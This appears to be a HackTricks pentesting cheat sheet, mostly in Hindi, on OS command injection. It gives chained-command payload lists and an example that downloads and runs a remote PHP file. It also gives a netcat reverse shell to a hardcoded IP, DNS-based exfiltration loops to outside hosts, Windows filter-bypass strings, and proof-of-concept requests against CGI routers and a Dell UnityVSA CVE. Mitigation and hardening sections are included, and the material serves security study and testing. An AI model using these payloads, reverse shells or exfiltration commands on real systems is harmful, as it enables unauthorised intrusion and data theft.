# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection क्या है?

एक **command injection** हमलावर को उस सर्वर पर मनमाने ऑपरेटिंग सिस्टम कमांड्स को निष्पादित करने की अनुमति देता है जो किसी एप्लिकेशन की होस्टिंग कर रहा हो। इसके परिणामस्वरूप, एप्लिकेशन और उसके सभी डेटा पूर्ण रूप से समझौता किए जा सकते हैं। इन कमांड्स के निष्पादन से आमतौर पर हमलावर को एप्लिकेशन के पर्यावरण और अंतर्निहित सिस्टम पर अनधिकृत पहुंच या नियंत्रण प्राप्त हो सकता है।

### संदर्भ

यह निर्भर करता है कि **आपका इनपुट कहाँ इंजेक्ट किया जा रहा है** — आपको कमांड्स से पहले **कोटेड संदर्भ** (`"` या `'`) को समाप्त (terminate) करना पड़ सकता है।

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limition** Bypasses

यदि आप **arbitrary commands inside a linux machine** को निष्पादित करने की कोशिश कर रहे हैं, तो आप इन **Bypasses:** के बारे में पढ़ने में रुचि रखेंगे:


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **उदाहरण**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### पैरामीटर

यहाँ उन शीर्ष 25 पैरामीटर की सूची है जो code injection और इसी तरह की RCE vulnerabilities के लिए vulnerable हो सकते हैं (from [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

डेटा निकालना: अक्षर-दर-अक्षर
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

इस टूल का स्रोत `https://github.com/HoLyVieR/dnsbin` पर आधारित है और यह dnsbin.zhack.ca पर भी होस्ट किया गया है
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS based data exfiltration की जांच के लिए ऑनलाइन टूल:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

जब आप JavaScript/TypeScript बैक-एंड्स का ऑडिट करते हैं, तो अक्सर आपको Node.js `child_process` API का सामना होगा।
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` एक **shell** (`/bin/sh -c`) को spawn करता है, इसलिए shell के लिए जिन भी characters का विशेष अर्थ होता है (back-ticks, `;`, `&&`, `|`, `$()`, …) वे तब **command injection** का कारण बनेंगे जब user input को string में concatenated किया जाता है।

**Mitigation:**  `execFile()` का उपयोग करें (या `spawn()` को `shell` विकल्प के बिना) और **each argument as a separate array element** प्रदान करें ताकि कोई shell शामिल न हो:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 एक unauthenticated WebSocket event के माध्यम से exploitable था, जिसने attacker-controlled डेटा को `id_user` में रखा जो बाद में एक `exec()` कॉल में एम्बेड किया गया, और RCE हासिल किया (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Not all injections require shell metacharacters. यदि एप्लिकेशन untrusted strings को system utility के arguments के रूप में पास करता है (यहाँ तक कि `execve`/`execFile` के साथ और बिना shell के), कई प्रोग्राम किसी भी argument को जो `-` या `--` से शुरू होता है, option के रूप में पार्स कर लेंगे। इससे एक attacker मोड बदल सकता है, output paths बदल सकता है, या shell में घुसे बिना ही खतरनाक व्यवहार ट्रिगर कर सकता है।

Typical places where this appears:

- Embedded web UIs/CGI handlers जो ऐसे कमांड बनाते हैं जैसे `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, आदि।
- Centralized CGI routers (e.g., `/cgi-bin/<something>.cgi` with a selector parameter like `topicurl=<handler>`) जहाँ कई handlers एक ही कमजोर validator reuse करते हैं।

What to try:

- ऐसे मान प्रदान करें जो `-`/`--` से शुरू होते हों ताकि downstream tool उन्हें flags के रूप में consume कर ले।
- उन flags का दुरुपयोग करें जो व्यवहार बदलते हैं या फाइलें लिखते हैं, उदाहरण के लिए:
- `ping`: `-f`/`-c 100000` डिवाइस पर दबाव डालने के लिए (DoS)
- `curl`: `-o /tmp/x` arbitrary paths पर लिखने के लिए, `-K <url>` attacker-controlled config लोड करने के लिए
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` unsafe wrappers में post-rotate execution हासिल करने के लिए
- यदि प्रोग्राम `--` end-of-options सपोर्ट करता है, तो उन naive mitigations को bypass करने की कोशिश करें जो गलत जगह पर `--` prepend कर देते हैं।

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force डिटेक्शन सूची


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks in Apache mod_perl handlers (पहुँच और दुरुपयोग)

वास्तविक दुनिया का पैटर्न: Perl code एक shell command string बनाता है और उसे backticks (या qx//) के जरिए execute करता है। mod_perl AccessHandler में, attacker-controlled request components जैसे $r->uri() उस string में flow कर सकते हैं। अगर किसी branch में raw input को concatenate कर के shell के साथ evaluate किया जाता है, तो आपको pre-auth RCE मिल सकता है।

Risky Perl execution primitives (जब इन्हें एक single string दी जाए तो shell spawn कर देते हैं):
- Backticks / qx//: my $out = `cmd ...`;
- system with a single string: system("/bin/sh -c '...'") implicitly
- open with a pipe: open my $fh, "cmd |" or "| cmd"
- IPC::Open3 with a single string

Minimal vulnerable shape observed in the wild:
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
mod_perl में पहुंच संबंधी प्रमुख विचार:
- हैंडलर रजिस्ट्रेशन: httpd.conf को अनुरोधों को आपके Perl मॉड्यूल में route करना चाहिए, जैसे PerlModule MOD_SEC_EMC::AccessHandler और ऐसी configuration जो किसी path scope के लिए AccessHandler::handler को invoke करे।
- कमजोर शाखा ट्रिगर करना: अनप्रमाणित login flow को मजबूर करें ताकि type == "login" हो (उदाहरण के लिए, अपेक्षित auth cookie छोड़ दें)।
- Resolvable path: सुनिश्चित करें कि आपका अनुरोध उस URI को लक्षित करता है जो configured scope के भीतर resolve होता है। यदि Apache कभी भी अनुरोध को handler के माध्यम से route नहीं करता, तो sink तक पहुंच नहीं बनती।

Exploitation workflow
1) httpd.conf की जाँच करें PerlModule/MOD_PERL handler scopes के लिए ताकि handler द्वारा process किए जाने वाले resolvable path को पाया जा सके।
2) एक अनप्रमाणित अनुरोध भेजें ताकि login redirect path लिया जाए (type == "login")।
3) request-URI path में shell metacharacters रखें ताकि $r->uri() आपका payload command string में ले जाए।

उदाहरण HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
टिप्स
- सेपरेटर आज़माएँ: ;, &&, |, `backticks`, $(...), और encoded newlines (%0A) quoting पर निर्भर करते हुए।
- अगर पहले के patches कुछ अन्य args को quote करते हैं लेकिन किसी ब्रांच में URI को नहीं, तो string के अंत में जोड़े गए payloads अक्सर काम करते हैं: ;id# या &&/usr/bin/id#

हार्डनिंग (Perl)
- shell strings न बनाएं। argument-vector execution को प्राथमिकता दें: system('/usr/bin/curl', '--silent', '--', $safe_url) — कोई shell नहीं।
- अगर shell अनिवार्य है, तो सभी ब्रांच में सख्ती से और लगातार escape करें; $r->uri() को hostile समझें। paths/queries के लिए URI::Escape और मजबूत allowlists पर विचार करें।
- command execution के लिए backticks/qx// से बचें; अगर वाकई ज़रूरत हो तो shell invoke किए बिना output को open3/list form के माध्यम से capture करें।
- mod_perl handlers में auth/redirect code paths को command execution से मुक्त रखें या सुनिश्चित करें कि सभी ब्रांच में sanitization एक समान हो ताकि “fixed everywhere but one branch” जैसी regressions ना हों।

Vulnerability hunting
- उन modules के patch-diff करें जो shell commands assemble करते हैं; ब्रांचों के बीच inconsistent quoting के लिए देखें (उदाहरण के लिए, if ($type eq 'login') को left unescaped छोड़ दिया गया हो)।
- backticks, qx//, open\s*\(|\||, और system\s*\(\s*" के लिए grep करें ताकि string-based shells मिलें। sink से request entry ($r) तक call graph बनाकर pre-auth reachability verify करें।

Real-world case: Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- Pre-auth command injection via backticks in AccessTool.pm:getCASURL when type == "login" concatenated raw $uri ($r->uri()).
- Reachable through MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login').
- व्यवहारिक नुक्ता: handler द्वारा कवर किए गए resolvable path का उपयोग करें; अन्यथा module execute नहीं होगा और sink hit नहीं होगा।

## References

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
